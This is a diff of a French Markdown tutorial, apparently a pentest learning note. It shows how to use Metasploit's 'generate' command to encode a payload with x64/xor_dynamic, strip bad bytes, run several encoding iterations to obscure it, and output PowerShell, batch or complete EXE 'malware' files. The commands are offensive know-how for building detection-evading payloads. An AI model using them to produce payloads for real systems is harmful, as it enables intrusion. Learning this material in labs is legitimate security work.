@@ -158,49 +158,49 @@ generate -b \x00\xff
 generate -h
 show encoders
 ````
-## encodons en shikataganai !:
+## encodons en XOR !:
 
 ````bash
-generate -e x86/shikata_ga_nai
+generate -e x64/xor_dynamic
 ````
 
 ## ajouton l option binaire :
 
 ````bash
-generate -e x86/shikata_ga_nai -b \xff
+generate -e x64/xor_dynamic -b "\xff"
 ````
 
 ## format powershell :
 
 ````bash
-generate -e x86/shikata_ga_nai -b \xff -f powershell
+generate -e x64/xor_dynamic -b "\xff" -f powershell
 ````
 
 ## format bat :
 
 ````bash
-generate -e x86/shikata_ga_nai -b \xff -f bat
+generate -e x64/xor_dynamic -b "\xff" -f bat
 ````
 
 ## double iteration pour rendre la lecture du code plus difficile :
 
 ````bash
-generate -e x86/shikata_ga_nai -b \xff -i 2 -f powershell
+generate -e x64/xor_dynamic -b "\xff" -i 2 -f powershell
 ````
 
 ajouter un chemin de fichier pour creer le fichier :
 
 ````bash
-generate -e x86/shikata_ga_nai -b \xff -i 2 -o /home/kali/Desktop/fichier.exe -f powershell
+generate -e x64/xor_dynamic -b "\xff" -i 2 -o /home/kali/Desktop/fichier.ps1 -f powershell
 ````
 format exe malwar complet en une ligne :
 
 ````bash
-generate -e x86/shikata_ga_nai -b \xff -i 2 -o /home/kali/Desktop/fichier.exe -f exe
+generate -e x64/xor_dynamic -b "\xff" -i 2 -o /home/kali/Desktop/fichier.exe -f exe
 ````
 
 ## c est fini on peut toujours rajouter plus d iteration y a d autre format , encoder, forme,option ,playload,module possible explorer tout 👍
-
+## A noter un encoder X86 ne va pas avec un playload X64 
 # maintenant nous allons utiliser msfvemon , tout d abord comprenons ce que c est :
 
 <img width="1277" height="718" alt="image" src="https://github.com/user-attachments/assets/a23ff33c-6aea-44f4-9b44-0db65c87a241" />
